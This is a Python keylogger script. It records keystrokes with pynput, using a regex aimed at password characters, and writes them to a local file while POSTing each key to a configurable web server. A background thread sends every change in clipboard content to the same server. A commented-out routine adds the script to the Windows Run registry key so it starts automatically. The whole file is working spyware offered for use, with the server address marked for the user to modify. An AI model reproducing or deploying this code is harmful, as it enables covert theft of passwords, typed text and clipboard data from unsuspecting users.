from pynput import keyboard
import os
import re
import time
import requests
import pyperclip
import threading
import winreg as reg

                    #--Modify these--#
#######################################################
port = 5000 
url = f"http://127.0.0.1:{port}" 
file_path = './file.log'
########################################################

last_line_checked = 0
matched_passwords = set()
previous_clipboard_content = None

########################################################
# regex values so that only alphanumeric keys are logged
password_pattern = re.compile(r'[a-zA-Z0-9@$!%*?&]')
########################################################

########################################################
special_keys = [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.tab]

content=''
########################################################
# Global variables
shift_pressed = False
caps_lock_pressed = False
exit_threads = False

# function which checks for the key pressed
def keyPressed(key):
    global text, shift_pressed, caps_lock_pressed
    text = ''
    letter = ''
    if key in special_keys:
        with open(file_path, 'a') as file:
            response = requests.post(url+'/keyboard', data="\n")
            file.write('\n')
        print("We got a line break!")

    if hasattr(key, "char") and key.char is not None:
        if key.char.isalpha():
            # Check if the left shift key, Caps Lock, or Shift key is active
            if shift_pressed or caps_lock_pressed or key.char.isupper():
                letter = key.char.upper()
            else:
                letter = key.char.lower()

        elif password_pattern.match(key.char):
            letter = key.char
        text += letter
        # writing the text to a log file 
        with open(file_path, 'a') as file:
           # and sending it to the specified web server
            response = requests.post(url+'/keyboard', data=letter.strip("'"))
            file.write(text)

    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = True

    elif key == keyboard.Key.caps_lock:
        caps_lock_pressed = not caps_lock_pressed

def keyReleased(key):
    global shift_pressed

    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False


def copyClipboard():
    global previous_clipboard_content
    clipboard = pyperclip.paste()
    # Only send a request if the clipboard content has changed
    response = requests.post(url+'/clipboard', data=clipboard)
 
# THIS MODIFIES THE REGISTRY KEYS AND IS DANGEROUS!!!   
# def AddToRegistry():
 
#     # in python __file__ is the instant of
#     # file path where it was executed 
#     # so if it was executed from desktop,
#     # then __file__ will be 
#     # c:\users\current_user\desktop
#     pth = os.path.dirname(os.path.realpath(__file__))
     
#     # name of the python file with extension
#     s_name="keylogger.py"    
     
#     # joins the file name to end of path address
#     address=os.join(pth,s_name) 
     
#     key = reg.HKEY_CURRENT_USER
#     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
     
#     # open the key to make changes to
#     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
#     reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
     
#     # now close the opened key
#     reg.CloseKey(open)

# Function to monitor clipboard content
def clipboard_monitor():
    previous_clipboard_content = None
    while not exit_threads:
        clipboard_content = pyperclip.paste()
        if clipboard_content != previous_clipboard_content:
            response = requests.post(url+'/clipboard', data=clipboard_content)
            previous_clipboard_content = clipboard_content
        time.sleep(1) 

def test():
    print("test")
################################
#------ MAIN FUNCTION ---------#
if __name__ == "__main__":
    # Start key listener thread
    key_listener_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=keyPressed, on_release=keyReleased).start())

    # Start clipboard monitor thread
    clipboard_monitor_thread = threading.Thread(target=clipboard_monitor)

    key_listener_thread.start()
    clipboard_monitor_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        exit_threads = True
        key_listener_thread.join()
        clipboard_monitor_thread.join()